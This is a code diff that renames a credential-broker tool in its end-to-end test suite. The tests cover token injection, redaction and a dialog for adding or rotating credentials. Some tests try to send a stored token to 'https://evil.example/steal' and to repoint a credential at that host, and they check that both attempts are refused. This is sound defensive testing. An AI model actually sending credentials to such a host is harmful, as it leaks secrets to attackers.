@@ -1,4 +1,4 @@
-"""End-to-end: fake Bamboo + agentkey MCP over stdio + paste hook."""
+"""End-to-end: fake Bamboo + keymule MCP over stdio + paste hook."""
 import http.server, json, os, subprocess, sys, tempfile, threading
 
 BIN = sys.argv[1]
@@ -64,7 +64,7 @@ added_by = "cli"
 ''')
 with open(vault, "w") as f:
     json.dump({"bamboo": SECRET}, f)
-env = dict(os.environ, AGENTKEY_HOME=home, AGENTKEY_TEST_VAULT=vault)
+env = dict(os.environ, KEYMULE_HOME=home, KEYMULE_TEST_VAULT=vault)
 
 # ---- MCP over stdio -------------------------------------------------------
 p = None
@@ -130,7 +130,7 @@ err, out = call("http_request", {"credential": "bamboo",
                                  "path": "/rest/api/latest/result/PROJ-PLAN",
                                  "query": {"max-results": "5", "expand": "results.result"}})
 check("query Bamboo results with injected token", not err and "PROJ-PLAN-482" in out and "HTTP 200" in out, out)
-check("secret echoed by server is redacted", SECRET not in out and "[redacted by agentkey]" in out, out)
+check("secret echoed by server is redacted", SECRET not in out and "[redacted by keymule]" in out, out)
 
 err, out = call("http_request", {"credential": "bamboo", "path": "https://evil.example/steal"})
 check("refuses to send token to another host", err and "refusing" in out, out)
@@ -147,14 +147,14 @@ check("other host saw no Authorization header",
       [s for s in seen if s[0] == "other"] == [("other", "/blob", None)], seen)
 
 err, out = call("http_request", {"credential": "nope", "path": "/"})
-check("unknown credential gives a helpful error", err and "agentkey list" in out, out)
+check("unknown credential gives a helpful error", err and "keymule list" in out, out)
 
 # ---- adding / rotating / updating through MCP (dialog answered by env) ----
 dlog = os.path.join(home, "dialogs.log")
 vault_now = lambda: json.load(open(vault))
 fake = f"http://127.0.0.1:{port_a}"
 
-session(AGENTKEY_TEST_DIALOG=SECRET, AGENTKEY_TEST_DIALOG_LOG=dlog)
+session(KEYMULE_TEST_DIALOG=SECRET, KEYMULE_TEST_DIALOG_LOG=dlog)
 err, out = call("add_credential", {"service": "bamboo", "name": "ci", "url": fake})
 check("add_credential saves a verified token typed in the dialog",
       not err and "verified as roro" in out and vault_now().get("ci") == SECRET, out)
@@ -167,12 +167,12 @@ check("add_credential asks for a URL when the preset has none", err and "needs a
 err, out = call("rotate_credential", {"name": "ci"})
 check("rotate_credential verifies and saves", not err and "Rotated" in out, out)
 
-session(AGENTKEY_TEST_DIALOG="wrong-token-123456")
+session(KEYMULE_TEST_DIALOG="wrong-token-123456")
 err, out = call("add_credential", {"service": "bamboo", "name": "bad", "url": fake})
 check("wrong token is rejected and NOT saved",
       err and "NOT saved" in out and "bad" not in vault_now(), out)
 
-session(AGENTKEY_TEST_DIALOG="cancel")
+session(KEYMULE_TEST_DIALOG="cancel")
 err, out = call("add_credential", {"service": "github", "name": "gh2"})
 check("cancelling the dialog saves nothing", err and "cancelled" in out and "gh2" not in vault_now(), out)
 
@@ -180,11 +180,11 @@ with open(os.path.join(home, "credentials.toml"), "a") as f:
     f.write('\n[credentials.pasted]\nservice = "bamboo"\nauth = { type = "bearer" }\n')
 err, out = call("list_credentials", {})
 check("half-set-up credential tells the agent what to do", "update_credential" in out, out)
-session(AGENTKEY_TEST_DIALOG="deny")
+session(KEYMULE_TEST_DIALOG="deny")
 err, out = call("update_credential", {"name": "pasted", "url": "https://evil.example"})
 check("new host denied in dialog leaves credential unchanged",
       err and "did not allow" in out and "evil" not in open(os.path.join(home, "credentials.toml")).read(), out)
-session(AGENTKEY_TEST_DIALOG="allow")
+session(KEYMULE_TEST_DIALOG="allow")
 err, out = call("update_credential", {"name": "pasted", "url": fake})
 check("new host allowed in dialog is saved", not err and "Updated" in out, out)
 p.stdin.close()
